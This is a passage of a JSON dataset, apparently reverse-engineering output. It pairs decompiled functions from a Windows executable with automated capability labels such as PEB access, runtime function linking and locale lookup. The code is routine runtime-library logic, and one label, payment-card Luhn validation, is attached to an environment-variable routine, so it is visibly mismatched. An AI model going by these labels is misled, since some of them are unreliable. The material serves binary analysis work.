        "decompiled_code": "\nuint fcn.004195fb(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n    var_4h = 0;\n    iVar2 = **0x442a88;\n    piVar3 = *0x442a88;\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = (*pcVar1)(0, 0, iVar2, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (var_4h = fcn.0040b8de(iVar2),  var_4h == 0)) break;\n        iVar2 = (*pcVar1)(0, 0, *piVar3, 0xffffffff, var_4h, iVar2, 0, 0);\n        if (iVar2 == 0) {\n            fcn.0040cfb5(var_4h);\n            return 0xffffffff;\n        }\n        iVar2 = fcn.00419ad9(&var_4h, 0);\n        if ((iVar2 < 0) && (var_4h != 0)) {\n            fcn.0040cfb5(var_4h);\n            var_4h = 0;\n        }\n        piVar3 = piVar3 + 1;\n        iVar2 = *piVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 361
    },
    "00419ad9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419ad9(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    bool bVar5;\n    uint var_10h;\n    uint var_ch;\n    uint lpValue;\n    uint var_4h;\n    \n    var_10h = 0;\n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    arg_8h_00 = *arg_8h;\n    if (arg_8h_00 == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.00419cd9(arg_8h_00, 0x3d);\n    if (iVar1 == 0) {\n        return 0xffffffff;\n    }\n    if (arg_8h_00 == iVar1) {\n        return 0xffffffff;\n    }\n    bVar5 = *(iVar1 + 1) == '\\0';\n    if (*0x442a80 == *0x442a84) {\n        *0x442a80 = fcn.00419a78();\n    }\n    if (*0x442a80 == NULL) {\n        if ((arg_ch != 0) && (*0x442a88 != NULL)) {\n            iVar2 = fcn.004195fb();\n            if (iVar2 != 0) {\n                return 0xffffffff;\n            }\n            goto code_r0x00419b8e;\n        }\n        if (!bVar5) {\n            *0x442a80 = fcn.0040b8de(4);\n            if (*0x442a80 == NULL) {\n                return 0xffffffff;\n            }\n            **0x442a80 = 0;\n            if (*0x442a88 == NULL) {\n                *0x442a88 = fcn.0040b8de(4);\n                if (*0x442a88 == NULL) {\n                    return 0xffffffff;\n                }\n                **0x442a88 = 0;\n            }\n            goto code_r0x00419b8e;\n        }\ncode_r0x00419b5c:\n        var_10h = 0;\n    }\n    else {\ncode_r0x00419b8e:\n        piVar3 = *0x442a80;\n        iVar2 = fcn.00419a2b(arg_8h_00);\n        if ((iVar2 < 0) || (*piVar3 == 0)) {\n            if (bVar5) {\n                fcn.0040cfb5(arg_8h_00);\n                *arg_8h = 0;\n                goto code_r0x00419b5c;\n            }\n            if (iVar2 < 0) {\n                iVar2 = -iVar2;\n            }\n            piVar3 = fcn.00412eb0(*0x442a80, iVar2 * 4 + 8);\n            if (piVar3 == NULL) {\n                return 0xffffffff;\n            }\n            piVar3[iVar2] = arg_8h_00;\n            (piVar3 + iVar2)[1] = 0;\n            *arg_8h = 0;\ncode_r0x00419c2b:\n            *0x442a80 = piVar3;\n        }\n        else {\n            piVar3 = piVar3 + iVar2;\n            fcn.0040cfb5(*piVar3);\n            if (bVar5) {\n                for (; *piVar3 != 0; piVar3 = piVar3 + 1) {\n                    *piVar3 = piVar3[1];\n                    iVar2 = iVar2 + 1;\n                }\n                piVar3 = fcn.00412eb0(*0x442a80, iVar2 << 2);\n                if (piVar3 != NULL) goto code_r0x00419c2b;\n            }\n            else {\n                *piVar3 = arg_8h_00;\n                *arg_8h = 0;\n            }\n        }\n        if (arg_ch != 0) {\n            iVar2 = fcn.0040bc50(arg_8h_00);\n            iVar2 = fcn.0040b8de(iVar2 + 2);\n            if (iVar2 != 0) {\n                fcn.00411ed0(iVar2, arg_8h_00);\n                puVar4 = (iVar2 - arg_8h_00) + iVar1;\n                *puVar4 = 0;\n                iVar1 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(iVar2, ~-bVar5 & puVar4 + 1);\n                if (iVar1 == 0) {\n                    var_10h = 0xffffffff;\n                }\n                fcn.0040cfb5(iVar2);\n            }\n        }\n        if (bVar5) {\n            fcn.0040cfb5(arg_8h_00);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 1125
    },
    "0040121c": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.0040121c(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    return *(in_FS_OFFSET + 0x30);\n}\n",
        "token_count": 34
    },
    "00401005": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401005(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00401082(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 101
    },
    "0040865a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040865a(int32_t param_1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    fcn.0040a224(2);\n    *(param_1 + 4) = 1;\n    do {\n        iVar2 = *(*(param_1 + 4) * 4 + 0x4426dc);\n        if ((iVar2 == 0) || (iVar2 == param_1)) break;\n        *(param_1 + 4) = *(param_1 + 4) + 1;\n    } while (*(param_1 + 4) < 8);\n    *(*(param_1 + 4) * 4 + 0x4426dc) = param_1;\n    pcVar1 = *(param_1 + 4) + 0x442704;\n    *pcVar1 = *pcVar1 + '\\x01';\n    fcn.0040a247();\n    return;\n}\n",
        "token_count": 223
    },
    "004086ab": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004086ab(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    fcn.00408638(0);\n    puVar2 = *(param_1 + 0x1c);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.0040b0dd(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x1c) = 0;\n    puVar2 = *(param_1 + 0x20);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.0040b0dd(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x20) = 0;\n    return;\n}\n",
        "token_count": 199
    },
    "00408bd1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00408bd1(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040b8de(param_1);\n        if (iVar1 != 0) break;\n        iVar1 = fcn.0040c332(param_1);\n        if (iVar1 == 0) {\n            fcn.0040a913();\n        }\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0040a484": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0040a484(void)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    code *pcVar3;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040c020();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *extraout_ECX = vtable.std::locale::_Locimp.0;\n    *(unaff_EBP + -4) = 1;\n    fcn.0040a224(0);\n    pcVar3 = extraout_ECX[3];\n    *(unaff_EBP + -4) = 2;\n    while (pcVar3 != NULL) {\n        pcVar3 = pcVar3 + -1;\n        if (*(extraout_ECX[2] + pcVar3 * 4) != 0) {\n            puVar2 = fcn.00408524();\n            if (puVar2 != NULL) {\n                (***puVar2)(1);\n            }\n        }\n    }\n    fcn.0040cfb5(extraout_ECX[2]);\n    *(unaff_EBP + -4) = 1;\n    fcn.0040a247();\n    fcn.00401168(1, 0);\n    uVar1 = *(unaff_EBP + -0xc);\n    *extraout_ECX = vtable.std::locale::facet.0;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 405
    },
    "0040b41f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040b41f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.0040f262();\n    piVar2 = *(iVar1 + 0x88);\n    while( true ) {\n        if (piVar2 == NULL) {\n            return 1;\n        }\n        if (*piVar2 == param_1) break;\n        piVar2 = piVar2[1];\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0040f8fe": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint16_t * fcn.0040f8fe(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = param_1;\n    do {\n        iVar1 = *param_2;\n        *piVar2 = iVar1;\n        piVar2 = piVar2 + 1;\n        param_2 = param_2 + 1;\n    } while (iVar1 != 0);\n    return param_1;\n}\n",
        "token_count": 118
    },
    "0041297e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041297e(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040f262();\n    *(iVar1 + 0xc) = param_1;\n    uVar2 = 0;\n    do {\n        if (param_1 == *(uVar2 * 8 + 0x441a60)) {\n            iVar1 = fcn.0040f262();\n            *(iVar1 + 8) = *(uVar2 * 8 + 0x441a64);\n            return;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0x2d);\n    if ((0x12 < param_1) && (param_1 < 0x25)) {\n        iVar1 = fcn.0040f262();\n        *(iVar1 + 8) = 0xd;\n        return;\n    }\n    if ((0xbb < param_1) && (param_1 < 0xcb)) {\n        iVar1 = fcn.0040f262();\n        *(iVar1 + 8) = 8;\n        return;\n    }\n    iVar1 = fcn.0040f262();\n    *(iVar1 + 8) = 0x16;\n    return;\n}\n",
        "token_count": 293
    },
    "00414cea": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00414cea(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    while( true ) {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (((cVar1 < 'A') || ('Z' < cVar1)) && ((cVar1 < 'a' || ('z' < cVar1)))) break;\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 130
    },
    "0040119f": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040119f(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    *(param_1 + 4) = 0;\n    *(param_1 + 0x18) = \"SPLASH\";\n    *(param_1 + 8) = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32.DLL\");\n    *0x4426c4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"SetLayeredWindowAttributes\");\n    return;\n}\n",
        "token_count": 127
    },
    "004111a4": {
        "rules": [
            "link function at runtime on Windows",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.004111a4(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"mscoree.dll\");\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"CorExitProcess\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(unaff_retaddr);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(unaff_retaddr);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 153
    },
    "00415600": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415600(uint Locale)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    uchar var_6h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    var_6h = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 0x1004, &lpLCData, 6);\n    if (iVar1 != 0) {\n        fcn.004182d7(&lpLCData);\n    }\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 134
    }
}